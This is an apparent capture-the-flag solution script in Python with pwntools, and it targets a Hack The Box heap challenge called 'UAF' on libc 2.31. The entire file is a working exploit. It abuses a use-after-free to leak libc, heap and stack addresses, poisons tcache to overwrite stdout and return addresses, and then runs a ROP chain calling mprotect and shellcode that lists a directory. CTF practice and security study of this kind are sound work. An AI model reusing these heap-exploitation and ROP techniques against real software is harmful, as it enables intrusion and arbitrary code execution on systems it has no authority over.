#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Utils
def alloc(size,data):
        io.sendlineafter("Choice: ","1")
        io.sendlineafter("Size: ",f"{size}")
        io.sendafter("Data: ",data)

def delete(idx):
        io.sendlineafter("Choice: ","2")
        io.sendlineafter("Index: ",f"{idx}")
        return  io.recvline().strip()

def edit(idx,data):
        io.sendlineafter("Choice: ","3")
        io.sendlineafter("Index: ",f"{idx}")
        io.sendafter("Data: ",data)

# libc 2.31
unsorted_bin_offset = 0x1ebbe0
_IO_2_1_stdout = 0x1ec6a0
environ = 0x1ef2e0

#Gadgets
L_syscall = 0x00097e29
L_pop_rdi = 0x0015cc5a
L_pop_rsi = 0x00156004
L_pop_rdx = 0x00162866 # pop rdx ; pop rbx ; ret
L_pop_rax = 0x00112cfb

#Exploit
if __name__=="__main__":
#       io = process("./UAF")
        io = remote("docker.hackthebox.eu",31780)

        alloc(0x18,"HK") #0
        alloc(0x400,"HK") #1
        alloc(0x18,"HK") #2
        alloc(0x18,"HK") #3
        delete(0)
        delete(3)
        edit(3,"\xb0") # uaf

        alloc(0x18,"HK") #0
        alloc(0x18,b"A"*0x8+p64(0x431)) #3

        delete(1)
        alloc(0x400,"HK") #1
        libc_leak = u64(delete(2).split(b": ")[1].strip().ljust(8,b"\0"))
        libc_base = libc_leak - unsorted_bin_offset
        print(f"Libc: {hex(libc_base)}")

        alloc(0x18,p64(libc_base+unsorted_bin_offset)*2) #2
        alloc(0x18,"HK") #4
        delete(1)
        alloc(0x400,"A"*0x10) #1
        heap_base = u64(delete(1).split(b": ")[1].replace(b"A",b"").ljust(8,b"\0")) - 0x2b0
        print(f"Heap: {hex(heap_base)}")

        for i in xrange(8): #1,5~11
        	alloc(0x18,"HK")
        for i in xrange(5,12): # Delete 5~11
          delete(i)
        delete(2)
        delete(0)
        delete(1)
        delete(4)

        for i in xrange(7): #0,1,2,4,5,6,7
          alloc(0x18,"\0"*8 + "HK"+str(i))
        alloc(0x18,p64(heap_base+0x800)) #8
        alloc(0x18,"HK") #9
        alloc(0x18,"HK") #10
        alloc(0x118,"HK") #11
        alloc(0x78,"HK") #12
        alloc(0x18,b"A"*0x8+p16(0x1a1)) #13
        alloc(0x78,"HK") #14
        delete(14)
        delete(12)
        delete(11)
        alloc(0x198,b"A"*0x118+p64(0x81)+p64(libc_base+_IO_2_1_stdout-0x10)) #11
        alloc(0x78,"HK") #12
        alloc(0x78,p64(0)*2+\
        	p64(0xfbad1800)+p64(0)*3+\
        	p64(libc_base+environ)+p64(libc_base+environ+0x20)*4)
        stack_leak = u64(io.recvn(8))
        print(f"Stack: {hex(stack_leak)}")

        delete(0)
        delete(1)
        alloc(0x78,"HK") #0
        delete(11)
        delete(0)
        delete(12)
        shellcode = asm(f"""
								xor rax,2
								mov rdi,{heap_base+0x930}
								mov rsi,0
								syscall
								mov rdi, rax
								mov rsi, {heap_base}
								mov rdx, 0x100
								mov rax, 0x4e
								syscall
								mov rdi, 1
								mov rax, 1
								syscall
				""",arch="amd64")
        alloc(0x198,shellcode.ljust(0x118,b"A")+p64(0x81)+p64(stack_leak-0x120)) #0
        alloc(0x78,"/home/ctf\0") #1
        L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base)+\
								p64(libc_base+L_pop_rsi)+p64(0x1000)+\
								p64(libc_base+L_pop_rdx)+p64(7)+p64(0)+\
								p64(libc_base+L_pop_rax)+p64(0xa)+\
								p64(libc_base+L_syscall)+\
								p64(heap_base+0x810)
        alloc(0x78,L_ROP) #11

        io.interactive()
